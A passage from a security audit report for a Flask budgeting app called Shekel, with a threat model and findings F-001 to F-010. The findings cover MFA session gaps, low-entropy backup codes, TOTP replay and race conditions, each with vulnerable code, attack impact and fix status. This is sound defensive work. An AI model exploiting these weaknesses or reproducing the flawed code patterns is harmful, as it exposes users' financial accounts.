# Shekel Security Audit -- 2026-04-15

## Summary

- **Scope:** Shekel commit `3cff592` on branch `audit/security-2026-04-15`.
  Repository: https://github.com/SaltyReformed/Shekel (private). Audit window:
  2026-04-15 through 2026-04-18. All code reads from the audit branch; all
  runtime observations from `shekel-prod-*` containers + standalone `nginx`
  + `cloudflared` on the production Arch Linux host.

- **Tool versions:**
  - bandit 1.9.4 (audit venv, Python 3.14.4)
  - semgrep 1.159.0 (rule packs: p/python, p/owasp-top-ten, p/flask)
  - pip-audit 2.9.0 (PyPA Advisory DB)
  - trivy 0.69.3 (aquasec/trivy-db)
  - gitleaks 8.30.1
  - detect-secrets 1.5.0
  - lynis 3.1.6
  - docker-bench v1.6.0 (CIS Docker Benchmark 1.6.0)
  - nmap -- version not captured in scan output; see F-166 (Info)
  - Python runtime in production container: 3.14.3
  - Base OS in container: Debian 13.4 (trixie) slim
  - Host OS: Arch Linux (rolling), kernel 7.0.0-1-cachyos

- **Counts after dedup:** **1 Critical / 30 High / 65 Medium / 45 Low /
  19 Info = 160 findings total.** 18 Info items rolled into
  "Informational Observations" after F-160; pre-dedup count across 19
  session reports was approximately 210.

- **Phase 3 status (as of 2026-05-08):** **75 Fixed / 85 Open /
  0 Deferred / 0 Accepted Risk** out of 160 main-listing
  findings. Fixed by severity (per the per-finding ``Severity:``
  fields below): 1 Critical, 18 High, 31 Medium, 24 Low, 1 Info.
  Open by severity: 11 High, 21 Medium, 51 Low, 2 Info. The 75
  Fixed findings closed across the 30 audit commits C-01..C-30
  currently merged into `dev`. Open findings are the remaining
  plan items C-31..C-58 (covering app cleanup, migrations,
  deploy/infra, and the host-hardening runbook). Phase 2
  follow-on findings F-161..F-164 were folded into
  C-21/C-27/C-26/C-20 respectively per the remediation plan
  preamble; they are not assigned individual entries below.

- **Top three risks**

  1. **Audit-log PostgreSQL trigger infrastructure is missing from the
     running production database.** Migration `a8b1c2d3e4f5` declares a
     `system.audit_log` table, an `audit_trigger_func()` PL/pgSQL
     function, and 22 AFTER INSERT/UPDATE/DELETE triggers on every
     financial and auth table. The production database's alembic_version
     points at `c7e3a2f9b104` (past this migration), yet live queries
     confirm zero audit_log rows, zero audit_trigger_func, and zero
     `audit_*` triggers. Every financial and auth mutation in production
     is happening with no row-level audit trail. Combined with F-080 (84
     of 93 mutating routes do not call `log_event()`) the forensic trail
     on this app is effectively "container stdout text logs," which the
     app container itself can rewrite. See F-028, F-080, F-151.
     Remediation is one migration that rebuilds the trigger set +
     pushing structured `log_event()` into the service layer, plus
     off-host log shipping so the app cannot self-erase.

  2. **Cryptographic posture has five one-line fixes that, together,
     close the "stolen laptop + rogue WiFi + shared computer" threat
     set.** HSTS is missing (F-018), `Cache-Control: no-store` is
     missing on financial pages (F-019), `REMEMBER_COOKIE_SECURE` and
     `REMEMBER_COOKIE_SAMESITE` are unset so the 30-day remember-me
     cookie ships in cleartext on any HTTP leak (F-017), the Flask
     SECRET_KEY was committed to git history in the initial commit
     (F-001, since rotated but historical sessions signed under it are
     still forgeable), and backup-code entropy is 32 bits, which is
     GPU-crackable offline if the bcrypt hashes leak (F-004). None of
     these fixes requires more than one commit; collectively they
     address five independent attack chains that the app is currently
     exposed to.

  3. **Anchor-balance + transfer-invariant enforcement is
     convention-only.** The single `current_anchor_balance` column on
     every account has no `version_id_col`, no `SELECT ... FOR UPDATE`,
     no CHECK constraint. Two concurrent true-up POSTs race and
     last-writer-wins silently (F-009). Every PATCH endpoint accepts
     stale form state, so a form from 10 minutes ago silently rewrites
     a transaction another tab just updated (F-010). `mark_as_credit`
     has a TOCTOU gap and no uniqueness constraint, so a double-click
     creates two CC Payback rows and silently doubles the projected
     expense (F-008). `recurrence_engine.resolve_conflicts` can mutate
     transfer shadows directly with no guard -- safe today only because
     the one caller filters on `template_id` (F-007). For a money app
     intending public release, these four findings are the most
     consequential correctness gaps in the audit.

## Threat Model Summary

From `reports/14-threat-model.md` (STRIDE, 6 assets × 4 attacker types ×
6 STRIDE categories = 144 cells). Assets: (1) User Account, (2)
Financial Data, (3) Anchor Balance, (4) Audit Log, (5) Cloudflare
Tunnel Credentials, (6) Docker Socket / Host Shell. Attackers: (A)
External unauthenticated, (B) Authenticated companion, (C) Compromised
dependency inside the app container, (D) Host-shell attacker.

Residual-risk cell counts: **40 Critical, 16 High, 7 Medium, ~24 Low,
~42 None, ~15 N/A.** Critical residuals concentrate in attacker types
C and D -- both have effectively unbounded access because the app
container already holds `DB_PASSWORD`, `SECRET_KEY`, and
`TOTP_ENCRYPTION_KEY` in its environment, and because the audit log
lives in the same database the attacker would be tampering with.

**Top residual threats (ranked by blast radius × likelihood):**

- **T-1 (C / any asset).** A compromised dependency inside the Shekel
  app container owns every asset simultaneously. One unreviewed package
  bump brings hostile code; the code can read `SECRET_KEY`,
  `TOTP_ENCRYPTION_KEY`, and `DATABASE_URL` from `os.environ`, dump
  every table, tamper with anchor balances, and rewrite the audit log
  to remove evidence. Primary remediations: F-028 (audit triggers), F-082
  (off-host log shipping), F-081 (least-privilege DB role), dependency
  pin-hash review (see F-158).

- **T-2 (C/D / Asset 3 Anchor Balance).** A tiny, undetected UPDATE to
  `budget.accounts.current_anchor_balance` cascades through every
  forward projection for 26 pay periods. Defense today is purely
  route-based, defeated by C/D. Primary remediation: F-009 (optimistic
  locking), F-077 (DB CHECK on financial columns).

- **T-3 (C/D / Asset 4 Audit Log).** Every repudiation attack works in
  two steps: act, then erase. The audit log lives in the same database
  the attacker has already compromised. Primary remediation: F-082
  (off-host log shipping to syslog/Loki/S3 with object-lock), F-028
  (restore Postgres trigger chain), F-151 (append-only log storage).

- **T-4 (A / Asset 1).** The WAN path from Cloudflare Tunnel to the app
  container bypasses nginx (F-063); `client_max_body_size 5M`, 30s
  timeouts, and `set_real_ip_from` are inert for WAN traffic. No
  Cloudflare Access policy in the committed config (F-061). Primary
  remediation: route cloudflared through the shared nginx OR add an
  Access policy at the edge.

- **T-5 (B / Asset 3 Anchor Balance).** A companion can theoretically
  trigger race conditions on an anchor-balance edit via HTMX
  double-click even without owner role, because F-009 is a structural
  gap that doesn't distinguish attacker role. Primary remediation: same
  as T-2.

---

## Findings

### F-001: Flask SECRET_KEY committed in git history (initial commit)

- **Severity:** Critical
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-798 (Use of Hard-Coded Credentials)
- **ASVS:** V2.10.4 (Secrets Not in Source Code)
- **Source:** S2 Section 1F (`reports/10-git-history.md` F-F-01); gitleaks
  scan `scans/gitleaks.json`, `scans/gitleaks.sarif`
- **Location:** Git history, commit `f9b35ecb5d71751923fceb77544fe57b18818ae2`
  ("initial build", 2026-02-21), file `app/config.py:21`
- **Description:** A 64-hex-character Flask `SECRET_KEY` was
  hardcoded in `app/config.py` in the initial commit. The key has since
  been rotated (production runtime `SECRET_KEY` observed in Section 1D
  container env starts with `5d5a...`, not the committed `a637...`),
  but the original value is permanently in the git history of the
  branch and any clone of the private repo.
- **Evidence:**
  ```
  gitleaks rule:    generic-api-key
  gitleaks match:   SECRET_KEY", "a637...9f2e"
  gitleaks entropy: 3.82
  commit:           f9b35ecb5d71751923fceb77544fe57b18818ae2
  file:             app/config.py:21
  ```
- **Impact:** Anyone with read access to the private repo (current or
  past collaborators, GitHub staff under incident, accidental public
  repo flip, backup leak) can extract the historical SECRET_KEY.
  Any Flask session cookie or `itsdangerous`-signed URL token ever
  issued under that key is forgeable forever. If the app ever keeps a
  30-day remember-me cookie that was signed under the old key (F-017
  shows this cookie is enabled), that cookie can still be presented by
  an attacker who harvested the key from history. Because the key was
  rotated but history was not rewritten, the window of signed cookies
  at risk is "everything issued 2026-02-21 through the rotation date."
- **Recommendation:** (1) Force-invalidate all pre-rotation sessions
  and remember-me cookies by bumping `users.session_invalidated_at =
  now()` for every user, or by setting `SECRET_KEY` rotation cutoff
  logic in `load_user`. (2) Rewrite the branch history via
  `git filter-repo` or BFG Repo-Cleaner to excise the commit containing
  the key. Coordinate the force-push with any other collaborators; on a
  solo repo this is straightforward. (3) Install a pre-commit hook
  (gitleaks or detect-secrets) so the pattern cannot recur. See also
  F-016 (still-present fallback default in `BaseConfig`) which is a
  separate defense-in-depth gap.
- **Status:** Fixed in C-01 (66082c4, 2026-05-01). Compensating controls
  shipped; the historical commit itself remains in branch history (a
  filter-repo rewrite is documented in `docs/runbook_secrets.md` as an
  operator-driven step). Compensations: `scripts/rotate_sessions.py`
  bumps `users.session_invalidated_at = now()` for every user, and
  `app/__init__.py:95-99` rejects sessions whose `_session_created_at`
  predates that bump on every request -- so any cookie ever signed
  under the leaked key is invalidated on the next load. `app/config.py:44`
  drops the BaseConfig fallback so the leaked-default code path is gone.

### F-002: Pending-MFA session state has no time limit

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **ASVS:** V3.3.2
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-01)
- **Location:** `app/routes/auth.py:100-107` (storage),
  `app/routes/auth.py:259-303` (consumption)
- **Description:** After a successful password check, the route stores
  `flask_session["_mfa_pending_user_id"]` and redirects to
  `/mfa/verify`. There is no timestamp on the pending state and no
  max-age check on consume. `PERMANENT_SESSION_LIFETIME` is unset
  (F-035), so Flask's default 31-day cookie lifetime applies. Anyone
  who recovers the cookie (shared device, cookie theft) within 31 days
  can complete the MFA step and log in as the victim given a single
  correct TOTP code.
- **Evidence:**
  ```python
  # app/routes/auth.py:100-107
  if mfa_config:
      flask_session["_mfa_pending_user_id"] = user.id
      flask_session["_mfa_pending_remember"] = remember
      pending_next = request.args.get("next")
      flask_session["_mfa_pending_next"] = (
          pending_next if _is_safe_redirect(pending_next) else None
      )
      return redirect(url_for("auth.mfa_verify"))
  ```
  No `_mfa_pending_at` timestamp is set. Grep of `app/` for
  `_mfa_pending_at` returns zero hits.
- **Impact:** Password compromise (phishing, typed on shared device,
  keylogger, reuse from another breach) is normally mitigated by TOTP.
  This erodes that mitigation for 31 days per successful password
  entry. An attacker who finds an authenticator app on a sticky note
  after the user has typed the password on a shared device within the
  past month can complete the login with a single correct code.
- **Recommendation:** In `/login` after the pending-MFA session keys
  are set, add `flask_session["_mfa_pending_at"] =
  datetime.now(timezone.utc).isoformat()`. In `/mfa/verify` at the top,
  reject requests where the stored timestamp is more than 5 minutes
  old (15 minutes is the outer bound per common practice). Clear all
  three pending keys on rejection and redirect to `/login`.
- **Status:** Fixed in C-08 (d5fa2f7, 2026-05-04).
  `app/routes/auth.py:411` stamps `flask_session["_mfa_pending_at"]`
  in `/login` when the pending-MFA keys are set; `_mfa_pending_state_recent`
  at `app/routes/auth.py:223-247` reads it at the top of `/mfa/verify`
  and rejects pending state older than 5 minutes (closing the cookie
  replay window). The constant is colocated in `app/routes/auth.py:114`
  alongside the rest of the pending-MFA session keys.

### F-003: Backup-code consumption does not invalidate other sessions

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **ASVS:** V2.5.7, V3.3.4
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-02)
- **Location:** `app/routes/auth.py:310-319` (consume) and `:325-344`
  (login completion)
- **Description:** When a backup code is consumed to pass MFA, the
  route correctly removes the hash from `mfa_config.backup_codes` and
  commits, then calls `login_user(user, ...)` and refreshes
  `_session_created_at` on the current session. It does NOT set
  `current_user.session_invalidated_at = now()`. Other sessions for the
  same user (including any remember-me cookie on the lost/compromised
  device that motivated the backup code) remain valid.
- **Evidence:**
  ```python
  # app/routes/auth.py:310-319 -- consume the backup code
  elif backup_code:
      idx = mfa_service.verify_backup_code(backup_code, mfa_config.backup_codes)
      if idx >= 0:
          mfa_config.backup_codes = [
              h for i, h in enumerate(mfa_config.backup_codes) if i != idx
          ]
          db.session.commit()
          valid = True
  ```
  The block at `:325-344` calls `login_user(user, ...)` without
  touching `session_invalidated_at`. Compare with `/change-password`
  at `:214-222` and `/invalidate-sessions` at `:231-247`, both of
  which correctly set `session_invalidated_at`.
- **Impact:** The canonical reason to use a backup code is that the
  authenticator device has been lost or compromised. In that scenario,
  any active session on the lost device is the attacker's session.
  Consuming a backup code should immediately invalidate every other
  session so the legitimate user is the only authenticated session.
  Today the attacker session remains authenticated in parallel.
- **Recommendation:** In the backup-code branch, after
  `db.session.commit()` at line 318 and before the `login_user` call
  at line 334, add `user.session_invalidated_at =
  datetime.now(timezone.utc)` and commit. The immediately-following
  `flask_session["_session_created_at"] = ...` at line 335 refreshes
  the current session so this login survives the invalidation. Mirror
  the pattern used in `/change-password:214-222`.
- **Status:** Fixed in C-08 (d5fa2f7, 2026-05-04).
  `app/routes/auth.py:889` calls `invalidate_other_sessions(user,
  "backup_code_consumed")` immediately after the backup-code
  consumption commit; the helper writes `session_invalidated_at = now()`
  and refreshes the current session's `_session_created_at` so the
  login survives. The same helper is used by `/change-password` and
  `mfa_disable_confirm`.

### F-004: Backup code entropy is 32 bits, below ASVS L2

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-330 (Use of Insufficiently Random Values)
- **ASVS:** V2.6.2 (112-bit entropy minimum)
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-14 Info) +
  S7 (`reports/18-asvs-l2.md` V2.6.2). S7 rerates the same issue as
  High for a money app because the offline-brute-force attack becomes
  trivial on a GPU if bcrypt hashes leak.
- **Location:** `app/services/mfa_service.py:112-137`
- **Description:** `generate_backup_codes()` uses
  `secrets.token_hex(4)` which emits 4 random bytes = 32 bits of
  entropy per code. ASVS L2 V2.6.2 requires >= 112 bits. The code
  length of 8 lowercase hex chars is too low to resist a GPU offline
  attack (~seconds on a consumer card once the bcrypt hashes are
  obtained) and is reachable online only through the `/mfa/verify` rate
  limit, which F-034 shows is drifted 2x under multi-worker gunicorn.
- **Evidence:**
  ```python
  # app/services/mfa_service.py:112-123
  def generate_backup_codes(count=10):
      """Generate a list of single-use backup codes.
      Each code is an 8-character lowercase hex string.
      """
      return [secrets.token_hex(4) for _ in range(count)]
  ```
- **Impact:** Online brute-force is currently impractical (rate limit),
  but if the bcrypt hashes ever leak (DB backup misplaced, host
  compromise, F-001-style leak), 32 bits × 10 codes is minutes on a
  GPU farm. The leaked backup codes then bypass TOTP for the next
  authentication attempt. For a money app intending public release, the
  "if hashes leak" scenario is the baseline ASVS L2 threat model.
- **Recommendation:** Change `secrets.token_hex(4)` to
  `secrets.token_hex(14)` (112 bits, 28 hex chars) or
  `secrets.token_urlsafe(16)` (128 bits, 22 URL-safe chars). Existing
  enrolled codes remain valid; next regeneration uses the new width.
  The UI template showing the codes may need to widen its column.
- **Status:** Fixed in C-03 (2026-05-02). `generate_backup_codes()` now
  uses `secrets.token_hex(14)` for 112-bit entropy (28 lowercase hex
  characters), satisfying ASVS L2 V2.6.2. The display template
  (`app/templates/auth/mfa_backup_codes.html`) widens the rendering
  column and adds a length hint. The verify form
  (`app/templates/auth/mfa_verify.html`) raises its `maxlength` to 28
  so users with the new codes can submit them; the previous `maxlength="8"`
  would otherwise have silently truncated input. Pre-upgrade 8-char codes
  remain valid until the user regenerates because bcrypt is
  length-agnostic; in-app regeneration prompt is delivered separately
  in C-16. Regression tests:
  `tests/test_services/test_mfa_service.py::TestBackupCodes` (length,
  format, 1000-sample uniqueness, `secrets.token_hex(14)` pinning,
  legacy 8-char acceptance) and
  `tests/test_routes/test_auth.py::TestMfaSetup::test_regenerate_backup_codes_renders_28_char_codes`
  /
  `test_mfa_confirm_renders_28_char_codes`.

### F-005: TOTP codes can be replayed within the valid window

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-294 (Authentication Bypass by Capture-replay)
- **ASVS:** V2.8.4 (TOTP Replay Prevention), V2.8.5 (Reuse Logging)
- **Source:** S7 (`reports/18-asvs-l2.md` V2.8.4 + V2.8.5). S1
  `reports/01-identity.md` flagged it as an open question but did not
  file. S7 is the authoritative finding.
- **Location:** `app/services/mfa_service.py:96-109`
- **Description:** `verify_totp_code` calls `pyotp.TOTP(secret).verify(
  code, valid_window=1)`. `pyotp.verify` is stateless: it accepts the
  previous, current, and next 30-second step (~90 seconds total drift).
  A single correct code can therefore be submitted up to ~90 seconds
  after the user first typed it. Shekel does not track which step was
  last consumed.
- **Evidence:**
  ```python
  # app/services/mfa_service.py:96-109
  return pyotp.TOTP(secret).verify(code, valid_window=1)
  ```
  Grep of `app/` for `last_totp|last_used_step|totp_last_step|
  otp_counter` returns zero hits. `auth.mfa_configs` schema has no
  column to track last-consumed step.
- **Impact:** Any observer of a TOTP code (shoulder surfer, screen
  share accident, MitM between browser and server on a downgrade
  attack before HSTS lands) can replay the code up to 90 seconds after
  the legitimate user submits it. The TOTP single-use guarantee is
  broken.
- **Recommendation:** Add a nullable `last_totp_timestep` integer
  column to `auth.mfa_configs`. In `verify_totp_code`, accept only
  codes whose computed time-step is strictly greater than
  `last_totp_timestep`; on success, update to the step number of the
  accepted code. This gives exact replay prevention without requiring
  state keyed on individual codes. Add a companion structured
  `log_event(..., "totp_replay_rejected", AUTH, ...)` call so the app
  can alert on replay attempts (V2.8.5 remediation).
- **Status:** Fixed in C-09 (e7e0bae, 2026-05-04).
  `app/models/user.py:339` adds the `last_totp_timestep` BigInteger
  column to `auth.mfa_configs`. `app/services/mfa_service.py:312`
  enforces `code_step > last_totp_timestep` and atomically advances
  the column on success. Companion structured event
  `EVT_TOTP_REPLAY_REJECTED` is registered at
  `app/utils/log_events.py:201` and emitted from
  `app/routes/auth.py:179` (and `:1210` for the MFA disable path),
  closing the V2.8.5 logging gap as well (see F-142).

### F-006: Idle timeout / periodic re-auth missing -- 30-day remember-me

- **Severity:** High
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **ASVS:** V3.3.2
- **Source:** S7 (`reports/18-asvs-l2.md` V3.3.2). Related to F-035
  (PERMANENT_SESSION_LIFETIME unset) but distinct: this is the
  remember-me cookie lifetime, not the session cookie lifetime.
- **Location:** `app/config.py:31-33`
- **Description:** `REMEMBER_COOKIE_DURATION = timedelta(days=30)` with
  no idle-timeout check anywhere in the app and no forced periodic
  re-authentication. A stolen or saved remember-me cookie is valid for
  30 days unattended. Compounded by F-017 (cookie SECURE/SAMESITE
  flags not set) and F-001 (pre-rotation cookies still forgeable
  against historical SECRET_KEY).
- **Evidence:**
  ```python
  # app/config.py:31-33
  REMEMBER_COOKIE_DURATION = timedelta(
      days=int(os.getenv("REMEMBER_COOKIE_DURATION_DAYS", "30"))
  )
  ```
  No `PERMANENT_SESSION_LIFETIME` in any config class.
  No idle-timestamp check in `app/__init__.py:load_user` (which checks
  `session_invalidated_at` but not last-activity).
- **Impact:** A 30-day remember-me cookie on a stolen laptop or shared
  browser profile gives an attacker 30 days of unattended access
  without ever typing a password again. For a money app this is the
  wrong default.
- **Recommendation:** Shorten `REMEMBER_COOKIE_DURATION_DAYS` to 7 (or
  enforce 24h for financial apps per ASVS L2). Add a
  `PERMANENT_SESSION_LIFETIME = timedelta(hours=12)` to `BaseConfig`.
  Add an idle-timeout check in `load_user`: if
  `_session_last_activity_at` is older than N minutes (e.g. 30), force
  re-authentication. Update `_session_last_activity_at` on every
  request via `before_request` hook.
- **Status:** Fixed in C-10 (2509357, 2026-05-04).
  `app/config.py:76` sets `PERMANENT_SESSION_LIFETIME` and
  `app/config.py:112-113` reduces `REMEMBER_COOKIE_DURATION` to 7 days
  (env-tunable via `REMEMBER_COOKIE_DURATION_DAYS`).
  `app/__init__.py:607-714` introduces `_session_last_activity_at`
  with a `before_request` stamp and idle-timeout check in `load_user`,
  forcing re-auth after the configured idle window.

### F-007: recurrence_engine.resolve_conflicts can mutate transfer shadows

- **Severity:** High
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-841 (Improper Enforcement of Behavioral Workflow)
- **ASVS:** V4.1.3
- **Source:** S1 Subagent B2 (`reports/02b-services.md` F-B2-01), S1
  Section 1C (`reports/07-manual-deep-dives.md` check 1C.2),
  S5 (`reports/16-business-logic.md` confirms F-B2-01). Three
  independent reads agree.
- **Location:** `app/services/recurrence_engine.py:249-288`
- **Description:** `resolve_conflicts(transaction_ids, action,
  user_id, new_amount=None)` accepts an arbitrary list of Transaction
  IDs and, for `action=="update"`, directly writes `is_override=False`,
  `is_deleted=False`, and `estimated_amount=new_amount` on each loaded
  Transaction. It ownership-checks via
  `txn.pay_period.user_id != user_id` but has **no** guard on
  `txn.transfer_id is not None`. Today the one documented caller
  (`regenerate_for_template`) filters the input list on
  `Transaction.template_id == template.id`, and `create_transfer`
  writes shadows with `template_id=None`, so shadows currently never
  enter the input set. Invariant 4 from CLAUDE.md ("No code path
  directly mutates a shadow") holds only by caller discipline.
- **Evidence:**
  ```python
  # app/services/recurrence_engine.py:249-288
  if action == "update":
      for txn_id in transaction_ids:
          txn = db.session.get(Transaction, txn_id)
          if txn is None:
              continue
          if txn.pay_period.user_id != user_id:
              continue
          txn.is_override = False
          txn.is_deleted = False
          if new_amount is not None:
              txn.estimated_amount = new_amount
      db.session.flush()
  ```
  No `if txn.transfer_id is not None` check. Per CLAUDE.md rule:
  "Enforced by convention (no code path actively blocks the violation)
  is itself a High finding for a money app, even if no current caller
  violates it."
- **Impact:** Any future caller that passes arbitrary transaction IDs
  (e.g. a bulk-override UI fed by form-posted ID lists) will silently
  violate invariants 3 and 4 at the same time: the shadow gets
  rewritten without its parent Transfer or its sibling shadow being
  touched, producing drift in amount/status/period and leaving the
  balance calculator reading a shadow that contradicts its parent.
- **Recommendation:** Add a fail-fast guard at the top of the per-ID
  loop:
  ```python
  if txn.transfer_id is not None:
      logger.warning(
          "resolve_conflicts refused to mutate shadow transaction %d "
          "(transfer_id=%d); route mutations through transfer service.",
          txn_id, txn.transfer_id,
      )
      raise ValidationError("Cannot modify transfer shadow via resolve_conflicts.")
  ```
  Update the function docstring to explicitly state the shadow-guard
  behavior. 30-minute fix plus one adversarial test that passes a
  shadow ID and asserts ValidationError.
- **Status:** Fixed in C-20 (f78531a, 2026-05-06).
  `app/services/recurrence_engine.py:413-425` adds the fail-fast
  shadow guard at the top of the per-ID loop in `resolve_conflicts`:
  any txn with `transfer_id is not None` is rejected with a logged
  refusal and an exception, never mutated. The docstring is updated
  to state the shadow-guard contract; an adversarial test was added
  to the `tests/test_services/test_recurrence_engine.py` suite.

### F-008: mark_as_credit / sync_entry_payback TOCTOU creates duplicate CC paybacks

- **Severity:** High
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-362 (Concurrent Execution using Shared Resource with
  Improper Synchronization)
- **ASVS:** V1.11.3
- **Source:** S5 (`reports/16-business-logic.md` H-C2-02 + H-C2-03).
  Two variants of the same underlying gap.
- **Location:** `app/services/credit_workflow.py:70-124`
  (`mark_as_credit`); `app/services/entry_credit_workflow.py:85-93`
  (`sync_entry_payback`)
- **Description:** `mark_as_credit` checks for an existing Payback
  transaction, sees none, flips the source transaction's status to
  CREDIT, and inserts a new Payback row. Under READ COMMITTED
  isolation (Postgres default), two concurrent sessions both read "no
  existing payback", both flip status, both insert. `budget.transactions`
  has no unique constraint on `credit_payback_for_id`, so both
  Payback inserts succeed. A double-click on the "mark as credit"
  button therefore produces two Payback Transaction rows pointing at
  the same source transaction. `sync_entry_payback` has the same
  structural gap when triggered via the Entries POST route.
- **Evidence:**
  ```python
  # app/services/credit_workflow.py (abridged)
  existing = db.session.query(Transaction).filter_by(
      credit_payback_for_id=source_txn.id, is_deleted=False,
  ).first()
  if existing is None:
      source_txn.status_id = credit_id
      payback = Transaction(
          credit_payback_for_id=source_txn.id,
          ...,
      )
      db.session.add(payback)
      db.session.commit()
  ```
  `scripts/repair_orphaned_transfers.py` in the repo documents that a
  similar "missing unique" bug has manifested in production before (for
  transfer shadows); the pattern matters.
- **Impact:** User double-clicks "mark as credit" on a $50 charge; two
  $50 CC Payback Transaction rows insert. Next period's projected
  balance is off by -$50 because the balance calculator sees two
  payback expenses where one should exist. If the user doesn't notice
  the duplicate, paycheck projections compound the error; if they do
  notice, one manual delete recovers it. Either way the app presented
  a silently-wrong balance.
- **Recommendation:** (1) **Database:** add a partial unique index
  `CREATE UNIQUE INDEX uq_transactions_credit_payback_unique ON
  budget.transactions (credit_payback_for_id) WHERE
  credit_payback_for_id IS NOT NULL AND is_deleted = FALSE;` via
  Alembic migration. (2) **Service:** wrap the
  check-insert-commit sequence in
  `db.session.query(Transaction).filter_by(id=source_txn.id)
  .with_for_update().one()` so the source row is locked for the
  duration of the decision. Both fixes are cheap; prefer both for
  defense in depth.
- **Status:** Fixed in C-19 (ab681b9, 2026-05-06).
  `app/models/transaction.py:52-56` adds the partial unique index
  `uq_transactions_credit_payback_unique` on
  `(credit_payback_for_id) WHERE credit_payback_for_id IS NOT NULL
  AND is_deleted = FALSE`; the matching Alembic migration is
  `migrations/versions/b3d8f4a01c92_add_partial_unique_index_for_credit_.py`.
  `app/services/credit_workflow.py:185` and the entry path at
  `app/services/entry_credit_workflow.py:120` re-query the
  payback child under the same transaction with `with_for_update`
  before insert, closing the TOCTOU window.

### F-009: Anchor balance updates are last-writer-wins

- **Severity:** High
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-362 (Concurrent Modification)
- **ASVS:** V1.11.3
- **Source:** S1 Subagent B2 (`reports/02b-services.md` F-B2-04,
  rated Medium), S5 (`reports/16-business-logic.md` H-C2-01, rated
  High with concrete attack). Taking S5's High rating because S5
  exercised the concrete double-click scenario.
- **Location:** `app/models/account.py:11-42` (model has no
  version_id_col); `app/routes/accounts.py:466-477`
  (`inline_anchor_update`), `:648-695` (`true_up`), `:220-274`
  (`update_account`)
- **Description:** `Account.current_anchor_balance` is a bare
  `Numeric(12,2)` column. The `Account` SQLAlchemy mapper has no
  `version_id_col`; no route uses `SELECT ... FOR UPDATE`; no route
  performs conditional UPDATE. Two concurrent PATCH posts to any of
  the three anchor-update endpoints read the current value, compute
  their own new value, and both commit with last-writer-wins. The
  `AccountAnchorHistory` audit trail records both events, but the
  effective balance is whoever reached Postgres last.
- **Evidence:**
  ```python
  # app/models/account.py:11-42
  class Account(db.Model):
      ...
      current_anchor_balance = db.Column(db.Numeric(12, 2))
      ...
      # no version_id = db.Column(...)
      # no __mapper_args__ = {"version_id_col": ...}
  ```
  Grep of `app/` for `with_for_update|FOR UPDATE|version_id_col`
  returns zero hits.
- **Impact:** User sets anchor to $1200 at 10:00:00 AM. Browser retries
  an earlier $1100 request due to a network hiccup at 10:00:01 AM.
  Anchor silently rolls back to $1100. Every downstream balance
  projection is wrong by $100 until the user notices and re-sets the
  value. False low-balance alerts may fire. For a money app intending
  public release with companion-role concurrent editing, the threat
  scales linearly with user count.
- **Recommendation:** Add an `Integer version_id NOT NULL DEFAULT 1`
  column to `budget.accounts` via Alembic migration, and set
  `__mapper_args__ = {"version_id_col": version_id}` on the Account
  mapper. SQLAlchemy will raise `StaleDataError` on any UPDATE where
  the version didn't match; the anchor-update routes should catch it
  and return HTTP 409 with a "someone else just changed this, please
  reload" prompt. This is the standard cheap fix; the alternative
  (`SELECT ... FOR UPDATE` on every anchor read in the route) is
  larger-scope and more invasive. See also F-010 for the stale-form
  variant of this problem.
- **Status:** Fixed in C-17 (a25c065, 2026-05-06).
  `app/models/account.py:14-35` adds the `version_id` column with
  `__mapper_args__ = {"version_id_col": version_id}` and a
  `version_id > 0` CHECK; SQLAlchemy now emits the optimistic-locking
  WHERE clause on every Account UPDATE. Anchor-balance routes catch
  `StaleDataError` and return 409 to the client. Stale-form prevention
  for the inline-anchor and true-up paths is layered on top via the
  C-18 generalisation (F-010).

### F-010: PATCH endpoints accept stale form amounts -- silent lost update

- **Severity:** High
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-362 (Concurrent Modification)
- **ASVS:** V1.11.3
- **Source:** S5 (`reports/16-business-logic.md` H-C2-04). Related to
  F-009 but broader in scope -- affects every PATCH endpoint.
- **Location:** `app/routes/transfers.py:617-648`
  (`update_transfer`), `app/routes/transactions.py:183-285`
  (`update_transaction`), `app/routes/entries.py:153-210`
  (`update_entry`, `toggle_cleared`), `app/routes/accounts.py:220-274`
  (`update_account`), `app/routes/salary.py` (raises/deductions PATCH
  paths), plus any other PATCH handler that `setattr`s fields from a
  form onto a model.
- **Description:** User opens Tab 1 with a transfer edit form showing
  amount=$500. User opens Tab 2, edits the same transfer to $600, and
  saves. User returns to Tab 1 (stale), edits only the Notes field,
  and saves. The form body from Tab 1 re-includes `amount=500`; the
  PATCH handler blindly writes it via the
  `for field, value in data.items(): setattr(txn, field, value)` loop;
  Tab 2's $600 is silently rolled back to $500. No audit trail warns
  the user that a field was overwritten -- only the final value is
  recorded.
- **Evidence:**
  ```python
  # app/routes/transactions.py:261-270
  data = _update_schema.load(request.form)
  ...
  for field, value in data.items():
      setattr(txn, field, value)
  ```
  No `If-Match` / `etag` / `version` check against the loaded txn's
  current state.
- **Impact:** A user's intentional edit in one tab is silently lost by
  a routine save in another tab on the same model. For transfers and
  transactions the lost field can be a dollar amount, a status_id, or
  an account_id. Multiply by the companion-role deployment where two
  people edit the same month's budget concurrently: frequent silent
  reverts.
- **Recommendation:** Add a `version_id` / `updated_at` field to each
  mutable model and require the edit form to submit the value it read.
  The PATCH handler performs a conditional update:
  `UPDATE ... SET ... WHERE id=:id AND version_id=:version_id`. If
  zero rows match, return HTTP 409 with the current state. This is the
  same pattern as F-009 but applied to every mutable row-fetch +
  setattr-loop. Scope is larger: every PATCH handler needs the
  signature change. Alternative cheaper mitigation: client-side
  dirty-field tracking (only submit fields the user actually edited).
  That narrows the blast radius to fields the user intended to change
  but does not fix the underlying race.
- **Status:** Fixed in C-18 (82c2c9d, 2026-05-06). The
